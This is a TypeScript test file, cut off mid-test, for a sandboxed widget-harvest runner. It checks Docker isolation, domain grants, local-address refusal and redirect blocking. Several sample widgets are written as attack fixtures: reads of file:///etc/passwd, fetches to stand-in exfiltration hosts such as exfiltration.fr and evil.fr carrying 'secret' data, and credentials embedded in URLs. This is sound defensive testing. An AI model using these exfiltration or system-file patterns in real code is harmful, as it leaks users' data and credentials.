import { describe, it, expect, afterEach, vi } from "vitest";
import { spawn } from "node:child_process";
import { PassThrough } from "node:stream";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { mkdir, readFile, rm, stat, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { join } from "node:path";
import { spacePaths } from "../../src/paths.js";
import { readHome } from "../../src/home/read.js";
import { Workshop, IMAGE } from "../../src/container/workshop.js";
import { DeclarationWidget, type WidgetRead } from "../../src/home/schemas.js";
import { writeData, writeWidgetState, readWidgetState, deleteData } from "../../src/home/data.js";
import { LocalAi } from "../../src/ai/local-ai.js";
import { FakeBridge } from "../../src/mcp/fake-bridge.js";
import { giveGrant, readGrants, removeGrant } from "../../src/widgets/grants.js";
import { approveReads } from "../../src/widgets/reads.js";
import { kernelError, runAttempt, runHarvest, WORKSHOP_STOPPED_ERROR, INTERRUPTED_ERROR, type ProcessLauncher } from "../../src/widgets/harvest.js";
import { PROFILE_DENIED } from "../../src/workflows/run.js";
import { writeRun, attemptId, readRun, listRuns, type Execution } from "../../src/workflows/executions.js";
import { withMemory, writeMemory, readMemory } from "../../src/workflows/memory.js";
import { Pacing } from "../../src/workflows/pacing.js";
import { searchUrl } from "../../src/workflows/duckduckgo.js";
import { tempFolder } from "../helpers/temp.js";
import { fakeRunner } from "../helpers/fake-runner.js";
import { fakeKev, fakeOllama, type FakeServer } from "../helpers/fake-ai.js";

const ENGINE = join(import.meta.dirname, "..", "..", "docker", "engine");
const SCRIPT = join(ENGINE, "harvester.mjs");
const NOW = new Date("2026-10-28T10:00:00.000Z");
const clock = () => NOW;

const toClose: { close(): Promise<void> }[] = [];
const aiToStop: LocalAi[] = [];
afterEach(async () => {
  await Promise.all(toClose.splice(0).map((s) => s.close()));
  await Promise.all(aiToStop.splice(0).map((i) => i.stop()));
});

/** Small HTTP server: `routes[chemin]` answers. */
async function webServer(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
  const requests: { url: string; headers: Record<string, unknown> }[] = [];
  const s: Server = createServer((req, res) => {
    requests.push({ url: req.url ?? "", headers: req.headers });
    const r = routes[req.url ?? ""];
    if (r) r(res);
    else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
  const port = (s.address() as AddressInfo).port;
  const server = {
    port,
    url: `http://127.0.0.1:${port}`,
    requests: requests,
    close: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
  };
  toClose.push(server);
  return server;
}

interface Context {
  widget: WidgetRead & { declaration: DeclarationWidget };
  widgetsFolder: string;
  space: string;
  commands: string[][];
  killed: number;
  run: ReturnType<typeof fakeRunner>;
  workshop: Workshop;
  launch: ProcessLauncher;
}

/** Creates a widget `id` (widget.json + harvest.mjs) and a launcher that runs the harvester locally, without docker. */
/** Without `unapproved`, a widget without account is approved as seeded at the update (any host). */
async function prepare(id: string, code: string, sources = { account: [] as string[], public: [] as string[] }, config: unknown = { a: 1 }, o: { unapproved?: true } = {}): Promise<Context> {
  const space = await tempFolder();
  const folder = join(space, "home", "widgets", id);
  await mkdir(folder, { recursive: true });
  const raw = {
    name: "Test",
    sizes: { min: { w: 1, h: 1 }, max: { w: 4, h: 4 }, default: { w: 2, h: 2 } },
    harvest: { minutes: 60 },
    sources,
    config,
  };
  await writeFile(join(folder, "widget.json"), JSON.stringify(raw));
  await writeFile(join(folder, "harvest.mjs"), code);
  const declaration = DeclarationWidget.parse(raw);
  const widgetsFolder = await tempFolder();
  if (!o.unapproved && sources.account.length === 0) await approveReads(widgetsFolder, id, { public: sources.public, web: true });
  const run = fakeRunner([]);
  const ctx: Context = {
    widget: {
      id,
      folder: folder,
      declaration,
      state: { status: "ok", lastUpdate: null, lastAttempt: null },
      data: null,
      example: null,
      hasHarvest: true,
      hasWorkflow: false,
      hasDisplay: true,
    },
    widgetsFolder: widgetsFolder,
    space: space,
    commands: [],
    killed: 0,
    run: run,
    workshop: new Workshop({ paths: spacePaths(space), docker: "docker", run: run.run }),
    launch: (cmd, args) => {
      ctx.commands.push([cmd, ...args]);
      const e = spawn(process.execPath, [SCRIPT, folder], { stdio: ["pipe", "pipe", "pipe"] });
      return {
        stdin: e.stdin,
        stdout: e.stdout,
        stderr: e.stderr,
        kill: () => {
          ctx.killed++;
          e.kill("SIGKILL");
        },
        end: new Promise((ok) => e.on("close", (c) => ok(c))),
      };
    },
  };
  return ctx;
}

async function ai(o: { kev?: FakeServer; ollama?: FakeServer } = {}) {
  const i = new LocalAi({ folder: await tempFolder(), run: fakeRunner([]).run, kevUrl: o.kev?.url ?? "http://127.0.0.1:9", ollamaUrl: o.ollama?.url ?? "http://127.0.0.1:9" });
  aiToStop.push(i);
  return i;
}

const readBridge = (deny: string[] = [], redirects?: Record<string, string>) =>
  new FakeBridge([], {
    active: null,
    allow: false,
    read: {
      pages: [{ url: "https://app.daily.dev/", title: "Fil", text: "articles", links: [{ text: "a", url: "https://app.daily.dev/a" }] }],
      deny: deny,
      redirects,
    },
  });

const readCalls = (p: FakeBridge) => p.calls.filter((a) => a.method === "readPageInvisible");

async function harvest(ctx: Context, o: { ai?: LocalAi | Pick<LocalAi, "kev" | "gemma">; bridge?: FakeBridge; delayMs?: number; locale?: () => string } = {}) {
  return runHarvest({
    id: ctx.widget.id,
    widget: ctx.widget,
    widgetsFolder: ctx.widgetsFolder,
    engine: ENGINE,
    workshop: ctx.workshop,
    launch: ctx.launch,
    ai: (o.ai ?? (await ai())) as LocalAi,
    bridge: o.bridge ?? readBridge(),
    clock: clock,
    locale: o.locale ?? (() => "fr"),
    delayMs: o.delayMs,
    localAddresses: true,
  });
}

const optionsOf = (ctx: Context) => ({
  id: ctx.widget.id,
  widget: ctx.widget as WidgetRead,
  widgetsFolder: ctx.widgetsFolder,
  engine: ENGINE,
  workshop: ctx.workshop,
  launch: ctx.launch,
  ai: null,
  bridge: readBridge(),
  clock: clock,
  locale: () => "fr",
  localAddresses: true,
});

const readJson = async (path: string) => JSON.parse(await readFile(path, "utf8"));

describe("runHarvest", () => {
  it("without account: a public domain not approved stops before the container, the approval lets it run, a lost domain still runs", async () => {
    const ctx = await prepare("pub", `export default async () => [1];`, { account: [], public: ["a.example"] }, undefined, { unapproved: true });
    const r = await runHarvest(optionsOf(ctx));
    expect(r.state).toMatchObject({ status: "grant-required", error: "Accord requis pour lire : a.example", kernelError: true });
    expect(kernelError(r.state.error!)).toBe(true);
    expect(ctx.commands).toEqual([]);
    await approveReads(ctx.widgetsFolder, "pub", { public: ["a.example", "b.example"], web: false });
    expect((await runHarvest(optionsOf(ctx))).state.status).toBe("ok");
    ctx.widget.declaration.sources.public = ["c.example"];
    expect((await runHarvest(optionsOf(ctx))).state.status).toBe("grant-required");
    ctx.widget.declaration.sources.public = ["b.example"];
    expect((await runHarvest(optionsOf(ctx))).state.status).toBe("ok");
  });

  it("a successful harvest writes data.json and the ok state in widgetsFolder", async () => {
    const web = await webServer({ "/flux.json": (res) => { res.writeHead(200, { "content-type": "application/json" }); res.end('{"x":42}'); } });
    const kev = await fakeKev({ q: { type: "noul", noul: 0.8 } });
    const ollama = await fakeOllama("bonjour");
    toClose.push(kev, ollama);
    const ctx = await prepare(
      "meteo",
      `export default async (w) => {
        const j = await w.fetch("${web.url}/flux.json", { format: "json" });
        const p = await w.readPage("https://app.daily.dev/");
        const k = await w.kev("etat", { q: { type: "noul", instructions: "?" } });
        const g = await w.gemma("salut");
        w.log("trace du widget");
        return { j, title: p.title, k, g, cfg: w.config, prev: w.previous, when: w.now };
      };`,
    );
    await writeData(ctx.widgetsFolder, "meteo", { old: true });
    const bridge = readBridge();
    const r = await harvest(ctx, { ai: await ai({ kev, ollama }), bridge: bridge });

    const expected = {
      j: { x: 42 },
      title: "Fil",
      k: { q: { type: "noul", noul: 0.8 } },
      g: "bonjour",
      cfg: { a: 1 },
      prev: { old: true },
      when: NOW.toISOString(),
    };
    expect(r.state.status).toBe("ok");
    expect(r.data).toEqual(expected);
    expect(await readJson(join(ctx.widgetsFolder, "meteo", "data.json"))).toEqual(expected);
    const state = await readWidgetState(ctx.widgetsFolder, "meteo");
    expect(state).toMatchObject({ status: "ok", lastUpdate: NOW.toISOString(), lastAttempt: NOW.toISOString() });
    expect(state.log).toContain("trace du widget");
    expect(readCalls(bridge)[0]!.args).toEqual(["https://app.daily.dev/", { profile: null, localAddresses: true }]);
    // No cookie or identifier sent.
    expect(web.requests[0]!.headers.cookie).toBeUndefined();
    expect(web.requests[0]!.headers.authorization).toBeUndefined();
    // Nothing is written in the space.
    expect(existsSync(join(ctx.widget.folder, "data.json"))).toBe(false);
    expect(existsSync(join(ctx.widget.folder, "state.json"))).toBe(false);
    // The launcher receives the workshop's docker command.
    expect(ctx.commands[0]).toEqual(ctx.workshop.harvestCommand("meteo", ctx.widget.folder, ENGINE));
  });

  it("harvestCommand mounts the widget as :ro, cuts the network (--network none) and mounts nothing else from the space", async () => {
    const workshop = new Workshop({ paths: spacePaths("/Users/t/Ressac"), docker: "/usr/local/bin/docker" });
    const c = workshop.harvestCommand("meteo", "/Users/t/Ressac/home/widgets/meteo", "/app/docker/engine");
    expect(c).toEqual([
      "/usr/local/bin/docker", "run", "-i", "--rm",
      "--name", "ressac-harvest-meteo",
      "--network", "none",
      "--read-only",
      "--tmpfs", "/tmp",
      "-v", "/Users/t/Ressac/home/widgets/meteo:/widget:ro",
      "-v", "/app/docker/engine:/opt/ressac/engine:ro",
      "--memory", "512m",
      "--pids-limit", "128",
      "--cpus", "1",
      "--cap-drop", "ALL",
      "--security-opt", "no-new-privileges",
      IMAGE,
      "timeout", "-k", "5", "180",
      "node", "/opt/ressac/engine/harvester.mjs", "/widget",
    ]);
    const volumes = c.flatMap((x, i) => (c[i - 1] === "-v" ? [x] : []));
    expect(volumes).toHaveLength(2);
    expect(volumes.every((v) => v.endsWith(":ro"))).toBe(true);
    expect(c.filter((x) => x.includes("/Users/t/Ressac")).every((x) => x.startsWith("/Users/t/Ressac/home/widgets/meteo:"))).toBe(true);
    expect(() => workshop.harvestCommand("../x", "/d", "/r")).toThrow();
    expect(() => new Workshop({ paths: spacePaths("/Users/t/Ressac"), docker: null }).harvestCommand("meteo", "/d", "/r")).toThrow();
  });

  it("supprimerRecolte forces the container's removal", async () => {
    const ctx = await prepare("meteo", "export default async () => 1;");
    await ctx.workshop.deleteHarvest("meteo");
    expect(ctx.run.calls.map((a) => [a.command, ...a.args])).toEqual([["docker", "rm", "-f", "ressac-harvest-meteo"]]);
  });

  it("a harvest that fails keeps the previous data and records the error and the log", async () => {
    const ctx = await prepare("meteo", `export default async (w) => { console.log("avant l'erreur"); throw new Error("boum ${"x".repeat(900)}"); };`);
    await writeData(ctx.widgetsFolder, "meteo", { old: true });
    const r = await harvest(ctx);
    expect(r.state.status).toBe("error");
    expect(r.data).toBeUndefined();
    expect(r.state.error).toContain("boum");
    expect(r.state.error!.length).toBeLessThanOrEqual(500);
    expect(r.state.log).toContain("avant l'erreur");
    expect(r.state.lastAttempt).toBe(NOW.toISOString());
    expect(await readJson(join(ctx.widgetsFolder, "meteo", "data.json"))).toEqual({ old: true });
    expect(await readWidgetState(ctx.widgetsFolder, "meteo")).toEqual(r.state);
  });

  it("the log keeps the last 2,000 characters of the error output", async () => {
    const ctx = await prepare("meteo", `export default async (w) => { for (let i = 0; i < 500; i++) w.log("ligne " + i); return 1; };`);
    const r = await harvest(ctx);
    expect(r.state.status).toBe("ok");
    expect(r.state.log!.length).toBeLessThanOrEqual(2000);
    expect(r.state.log).toContain("ligne 499");
    expect(r.state.log).not.toContain("ligne 1\n");
  });

  it("a non-zero output without an end is an error", async () => {
    const ctx = await prepare("meteo", `export default async () => { process.exit(3); };`);
    const r = await harvest(ctx);
    expect(r.state.status).toBe("error");
    expect(r.state.error).toContain("3");
  });

  it("timeout exceeded: process killed, error state « Délai dépassé »", async () => {
    const ctx = await prepare("lent", `export default () => new Promise(() => {});`);
    await writeData(ctx.widgetsFolder, "lent", { old: true });
    const start = Date.now();
    const r = await harvest(ctx, { delayMs: 600 });
    expect(Date.now() - start).toBeLessThan(5000);
    expect(r.state).toMatchObject({ status: "error", error: "Délai dépassé" });
    // The same run in English writes English, and the kernel still recognises it.
    const en = await harvest(ctx, { delayMs: 600, locale: () => "en" });
    expect(en.state).toMatchObject({ status: "error", error: "Timed out", kernelError: true });
    expect(ctx.killed).toBeGreaterThan(0);
    expect(ctx.run.calls.some((a) => a.args.join(" ") === "rm -f ressac-harvest-lent")).toBe(true);
    expect(await readJson(join(ctx.widgetsFolder, "lent", "data.json"))).toEqual({ old: true });
  });

  it("a line over 4 MB kills the harvest: « Réponse trop grande »", async () => {
    const ctx = await prepare("gros", `export default async () => { process.stdout.write("x".repeat(5 * 1024 * 1024)); await new Promise(() => {}); };`);
    const r = await harvest(ctx);
    expect(r.state).toMatchObject({ status: "error", error: "Réponse trop grande" });
    expect(ctx.killed).toBeGreaterThan(0);
  });

  it("several in-flight calls each receive their own response", async () => {
    const web = await webServer({
      "/lent": (res) => setTimeout(() => res.end("lent"), 300),
      "/vite": (res) => res.end("vite"),
    });
    const ctx = await prepare(
      "multi",
      `export default async (w) => Promise.all([w.fetch("${web.url}/lent"), w.fetch("${web.url}/vite"), w.fetch("${web.url}/vite")]);`,
    );
    const r = await harvest(ctx);
    expect(r.data).toEqual(["lent", "vite", "vite"]);
  });

  it("recuperer: http(s) only, without credentials in the URL", async () => {
    const ctx = await prepare(
      "public",
      `const essai = (p) => p.then(() => "ok", (e) => e.message);
      export default async (w) => [
        await essai(w.fetch("file:///etc/passwd")),
        await essai(w.fetch("https://moi:secret@exemple.fr/")),
        await essai(w.fetch("pas une url")),
      ];`,
    );
    const r = await harvest(ctx);
    expect(r.state.status).toBe("ok");
    const [file, identifiers, invalid] = r.data as string[];
    expect(file).toMatch(/http/);
    expect(identifiers).toMatch(/identifiants/i);
    expect(invalid).toMatch(/invalide/i);
  });

  it("recuperer: a local address is refused by default", async () => {
    const web = await webServer({ "/": (res) => res.end("secret local") });
    const ctx = await prepare("public", `export default async (w) => w.fetch("${web.url}/").catch((e) => e.message);`);
    const r = await runHarvest({
      id: "public", widget: ctx.widget, widgetsFolder: ctx.widgetsFolder, engine: ENGINE, workshop: ctx.workshop,
      launch: ctx.launch, ai: await ai(), bridge: readBridge(), clock: clock, locale: () => "fr",
    });
    expect(r.data).toMatch(/locale/);
    expect(web.requests).toHaveLength(0);
  });

  it("recuperer: « localhost. » (trailing dot) is a local address, refused", async () => {
    const web = await webServer({ "/": (res) => res.end("secret local") });
    const ctx = await prepare(
      "public",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [await essai(w.fetch("http://localhost.:${web.port}/")), await essai(w.readPage("http://localhost.:${web.port}/"))];`,
    );
    const bridge = readBridge();
    const r = await runHarvest({
      id: "public", widget: ctx.widget, widgetsFolder: ctx.widgetsFolder, engine: ENGINE, workshop: ctx.workshop,
      launch: ctx.launch, ai: await ai(), bridge: bridge, clock: clock, locale: () => "fr",
    });
    const [rec, page] = r.data as string[];
    expect(rec).toMatch(/^refus: .*locale/);
    expect(page).toMatch(/^refus: .*locale/);
    expect(web.requests).toHaveLength(0);
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("recuperer: response over 5 MB refused", async () => {
    const web = await webServer({ "/gros": (res) => res.end("x".repeat(5 * 1024 * 1024 + 10)) });
    const ctx = await prepare("public", `export default async (w) => w.fetch("${web.url}/gros").then((t) => t.length, (e) => e.message);`);
    const r = await harvest(ctx);
    expect(r.data).toMatch(/5 Mo/);
  });

  it("without lirePageInvisible, lirePage answers « Lecture de pages indisponible »", async () => {
    const ctx = await prepare("public", `export default async (w) => w.readPage("https://a.fr/").catch((e) => e.message);`);
    const r = await harvest(ctx, { bridge: new FakeBridge([], { active: null, allow: false }) });
    expect(r.data).toBe("Lecture de pages indisponible");
  });

  it("widget without an account: lirePage with an account is refused", async () => {
    const ctx = await prepare("public", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true }).catch((e) => e.message);`);
    const bridge = readBridge();
    const r = await harvest(ctx, { bridge: bridge });
    expect(r.data).toMatch(/non déclaré/);
    expect(readCalls(bridge)).toHaveLength(0);
  });
});

describe("runHarvest, widget with an account", () => {
  const sources = { account: ["app.daily.dev"], public: ["127.0.0.1"] };

  it("widget with an account: lirePage compte without a grant → accord-requis, no read", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    await writeData(ctx.widgetsFolder, "daily", { old: true });
    const bridge = readBridge();
    const r = await harvest(ctx, { bridge: bridge });
    expect(r.state.status).toBe("grant-required");
    expect(readCalls(bridge)).toHaveLength(0);
    expect(await readJson(join(ctx.widgetsFolder, "daily", "data.json"))).toEqual({ old: true });
    expect((await readWidgetState(ctx.widgetsFolder, "daily")).status).toBe("grant-required");
  });

  it("grant removed during the harvest: the read with an account does not happen, accord-requis", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => { await w.kev("x", {}); return w.readPage("https://app.daily.dev/", { account: true }); };`,
      sources,
    );
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = readBridge();
    const fake = {
      kev: async () => { await removeGrant(ctx.widgetsFolder, "daily"); return {}; },
      gemma: async () => "",
    };
    const r = await harvest(ctx, { bridge: bridge, ai: fake });
    expect(r.state.status).toBe("grant-required");
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("with a valid grant, lirePage compte reads in the grant's profile", async () => {
    const ctx = await prepare("daily", `export default async (w) => (await w.readPage("https://app.daily.dev/", { account: true })).text;`, sources);
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { bridge: bridge });
    expect(r.state.status).toBe("ok");
    expect(r.data).toBe("articles");
    expect(readCalls(bridge)[0]!.args).toEqual(["https://app.daily.dev/", { profile: "perso", domains: ["app.daily.dev"], localAddresses: true }]);
  });

  it("lirePage compte to a domain not declared as account is refused", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://evil.fr/", { account: true }).catch((e) => e.message);`, sources);
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { bridge: bridge });
    expect(r.data).toMatch(/non déclaré/);
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("widget with an account: recuperer to an undeclared domain is refused", async () => {
    const web = await webServer({ "/": (res) => res.end("ok") });
    const ctx = await prepare(
      "daily",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [
        await essai(w.fetch("https://exfiltration.fr/?d=secret")),
        await essai(w.fetch("http://localhost:${web.port}/")),
        await essai(w.readPage("https://exfiltration.fr/")),
        await essai(w.fetch("${web.url}/")),
      ];`,
      sources,
    );
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { bridge: bridge });
    const [external, otherName, page, declare] = r.data as string[];
    expect(external).toMatch(/^refus: .*non déclaré/);
    expect(otherName).toMatch(/^refus: .*non déclaré/);
    expect(page).toMatch(/^refus: .*non déclaré/);
    expect(declare).toBe("ok");
    expect(web.requests).toHaveLength(1);
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("widget with an account: a redirect to an undeclared domain is refused", async () => {
    const target = await webServer({ "/fuite": (res) => res.end("fuite") });
    const web = await webServer({
      "/redir": (res) => { res.writeHead(302, { location: `http://localhost:${target.port}/fuite` }); res.end(); },
      "/redir-ok": (res) => { res.writeHead(301, { location: "/fin" }); res.end(); },
      "/fin": (res) => res.end("arrivé"),
    });
    const ctx = await prepare(
      "daily",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [await essai(w.fetch("${web.url}/redir")), await essai(w.fetch("${web.url}/redir-ok"))];`,
      sources,
    );
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const r = await harvest(ctx);
    const [leak, ok] = r.data as string[];
    expect(leak).toMatch(/^refus: .*non déclaré/);
    expect(ok).toBe("arrivé");
    expect(target.requests).toHaveLength(0);
  });

  it("widget with an account and without public ones: no public fetch", async () => {
    const web = await webServer({ "/": (res) => res.end("ok") });
    const ctx = await prepare("daily", `export default async (w) => w.fetch("${web.url}/").catch((e) => "refus: " + e.message);`, { account: ["app.daily.dev"], public: [] });
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: [], profile: "perso" });
    const r = await harvest(ctx);
    expect(r.data).toMatch(/^refus: .*non déclaré/);
    expect(web.requests).toHaveLength(0);
  });

  it("a declared domain written with a trailing dot is the same domain", async () => {
    const ctx = await prepare(
      "daily",
      `const essai = (p) => p.then((x) => x.title ?? x, (e) => "refus: " + e.message);
      export default async (w) => [
        await essai(w.readPage("https://app.daily.dev./", { account: true })),
        await essai(w.readPage("https://evil.fr./", { account: true })),
      ];`,
      sources,
    );
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { bridge: bridge });
    const [declare, other] = r.data as string[];
    expect(declare).not.toMatch(/^refus/);
    expect(other).toMatch(/^refus: .*non déclaré/);
    expect(readCalls(bridge).map((a) => a.args[0])).toEqual(["https://app.daily.dev./"]);
  });

  it("lirePage compte redirected outside the account domains: refused, the text does not leave", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => w.readPage("https://app.daily.dev/", { account: true }).then((p) => p.text, (e) => "refus: " + e.message);`,
      sources,
    );
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = new FakeBridge([], {
      active: null,
      allow: false,
      read: {
        pages: [{ url: "https://evil.fr/vole", title: "Ailleurs", text: "texte secret", links: [] }],
        redirects: { "https://app.daily.dev/": "https://evil.fr/vole" },
      },
    });
    const r = await harvest(ctx, { bridge: bridge });
    expect(r.data).toMatch(/^refus: Page refusée.*evil\.fr/);
    expect(JSON.stringify(r.data)).not.toContain("texte secret");
    expect(readCalls(bridge)[0]!.args[1]).toEqual({ profile: "perso", domains: ["app.daily.dev"], localAddresses: true });
  });

  it("public lirePage of a widget with an account: public domains passed to the bridge, redirect outside the list refused", async () => {
    const ctx = await prepare(
      "daily",
      `export default async (w) => w.readPage("http://127.0.0.1/?d=secret").then((p) => p.text, (e) => "refus: " + e.message);`,
      sources,
    );
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const bridge = new FakeBridge([], {
      active: null,
      allow: false,
      read: {
        pages: [{ url: "https://evil.fr/?d=secret", title: "", text: "ailleurs", links: [] }],
        redirects: { "http://127.0.0.1/?d=secret": "https://evil.fr/?d=secret" },
      },
    });
    const r = await harvest(ctx, { bridge: bridge });
    expect(r.data).toMatch(/^refus: Page refusée.*non déclaré/);
    expect(readCalls(bridge)[0]!.args[1]).toEqual({ profile: null, domains: ["127.0.0.1"], localAddresses: true });
  });

  it("without the localAddresses option, the bridge does not receive localAddresses (it then refuses local addresses)", async () => {
    const ctx = await prepare("daily", `export default async (w) => (await w.readPage("https://app.daily.dev/")).title;`);
    const bridge = readBridge();
    const r = await runHarvest({ ...optionsOf(ctx), bridge: bridge, localAddresses: false });
    expect(r.data).toBe("Fil");
    expect(readCalls(bridge)[0]!.args).toEqual(["https://app.daily.dev/", { profile: null }]);
  });

  it("ProfileDenied from the bridge: grant removed, state accord-requis", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    await writeData(ctx.widgetsFolder, "daily", { old: true });
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "prive" });
    await giveGrant(ctx.widgetsFolder, "autre", { domains: ["a.fr"], public: [], profile: "perso" });
    const r = await harvest(ctx, { bridge: readBridge(["prive"]) });
    expect(r.state.status).toBe("grant-required");
    expect(r.state.error).toBeTruthy();
    expect(await readGrants(ctx.widgetsFolder)).toEqual({ autre: { domains: ["a.fr"], public: [], profile: "perso" } });
    // The data read with this account leaves with the grant.
    expect(existsSync(join(ctx.widgetsFolder, "daily", "data.json"))).toBe(false);
  });

  it("ProfileDenied then account removed: the public harvest receives nothing of the account, nor does the home", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    await writeData(ctx.widgetsFolder, "daily", { secret: "du compte" });
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "prive" });
    expect((await harvest(ctx, { bridge: readBridge(["prive"]) })).state.status).toBe("grant-required");
    // The agent removes the account: the widget becomes public again (neither account nor grant).
    const raw = { name: "Test", sizes: { min: { w: 1, h: 1 }, max: { w: 4, h: 4 }, default: { w: 2, h: 2 } }, harvest: { minutes: 60 }, sources: { account: [], public: [] } };
    await writeFile(join(ctx.widget.folder, "widget.json"), JSON.stringify(raw));
    await writeFile(join(ctx.widget.folder, "harvest.mjs"), "export default async (w) => ({ prev: w.previous });");
    const home = await readHome(spacePaths(ctx.space), ctx.widgetsFolder);
    const parsed = home.widgets.find((w) => w.id === "daily")!;
    expect("data" in parsed && parsed.data).toBeNull(); // what widget_data would return
    const r = await runHarvest({ ...optionsOf(ctx), widget: parsed });
    expect(r.data).toEqual({ prev: null });
  });

  it("declaration modified (domains changed): the grant is removed and the previous data erased", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    await writeData(ctx.widgetsFolder, "daily", { secret: "du compte" });
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev", "ancien.dev"], public: ["127.0.0.1"], profile: "perso" });
    const r = await harvest(ctx);
    expect(r.state.status).toBe("grant-required");
    expect(await readGrants(ctx.widgetsFolder)).toEqual({});
    expect(existsSync(join(ctx.widgetsFolder, "daily", "data.json"))).toBe(false);
  });

  it("account removed from the declaration with a recorded grant: grant removed, data erased, precedent null", async () => {
    const ctx = await prepare("daily", `export default async (w) => ({ prev: w.previous });`, { account: [], public: [] });
    await writeData(ctx.widgetsFolder, "daily", { secret: "du compte" });
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
    const r = await harvest(ctx);
    expect(r.state.status).toBe("ok");
    expect(r.data).toEqual({ prev: null });
    expect(await readGrants(ctx.widgetsFolder)).toEqual({});
    expect(await readJson(join(ctx.widgetsFolder, "daily", "data.json"))).toEqual({ prev: null });
  });

  it("erreurDuNoyau: fixed kernel messages recognized, widget text not", () => {
    // Written in English now, stored in French before: both are the kernel's.
    expect(kernelError("Timed out")).toBe(true);
    expect(kernelError("Response too large")).toBe(true);
    expect(kernelError("Grant required to read with your account: app.daily.dev")).toBe(true);
    expect(kernelError("Grant required to read with your account: SECRET account")).toBe(false);
    expect(kernelError(WORKSHOP_STOPPED_ERROR("en"))).toBe(true);
    expect(kernelError(INTERRUPTED_ERROR("en"))).toBe(true);
    expect(kernelError(PROFILE_DENIED("en"))).toBe(true);
    expect(kernelError("Timed out SECRET")).toBe(false);
    expect(kernelError("Délai dépassé")).toBe(true);
    expect(kernelError("Réponse trop grande")).toBe(true);
    expect(kernelError("Accord requis pour lire avec ton compte : app.daily.dev")).toBe(true);
    // Written with the widget's exit code: counts as widget text.
    expect(kernelError("La récolte s'est arrêtée sans résultat (code 1)")).toBe(false);
    expect(kernelError("Mise à jour impossible : atelier arrêté")).toBe(true);
    expect(kernelError("SECRET")).toBe(false);
    expect(kernelError("Délai dépassé SECRET")).toBe(false);
    expect(kernelError("La récolte s'est arrêtée sans résultat (code 1) SECRET")).toBe(false);
  });

  it("a grant whose domains no longer match the declaration is no longer valid", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: [], profile: "perso" });
    const bridge = readBridge();
    const r = await harvest(ctx, { bridge: bridge });
    expect(r.state.status).toBe("grant-required");
    expect(readCalls(bridge)).toHaveLength(0);
  });

  it("error thrown by the widget: never marked as the kernel's, even when it imitates a kernel message", async () => {
    for (const imitation of [
      "Accord requis pour lire avec ton compte : " + (123456789).toString(36),
      "La récolte s'est arrêtée sans résultat (code 123456789)",
    ]) {
      const ctx = await prepare(
        "daily",
        `export default async (w) => { await w.readPage("https://app.daily.dev/", { account: true }); throw new Error(${JSON.stringify(imitation)}); };`,
        sources,
      );
      await giveGrant(ctx.widgetsFolder, "daily", { domains: ["app.daily.dev"], public: ["127.0.0.1"], profile: "perso" });
      const r = await harvest(ctx);
      expect(r.state).toMatchObject({ status: "error", error: imitation });
      expect(r.state.kernelError).toBeUndefined();
      expect((await readWidgetState(ctx.widgetsFolder, "daily")).kernelError).toBeUndefined();
    }
  });

  it("errors written by the kernel: marked as such (grant required, timeout exceeded)", async () => {
    const ctx = await prepare("daily", `export default async (w) => w.readPage("https://app.daily.dev/", { account: true });`, sources);
    const r = await harvest(ctx);
    expect(r.state).toMatchObject({ status: "grant-required", error: "Accord requis pour lire avec ton compte : app.daily.dev", kernelError: true });
    expect((await readWidgetState(ctx.widgetsFolder, "daily")).kernelError).toBe(true);
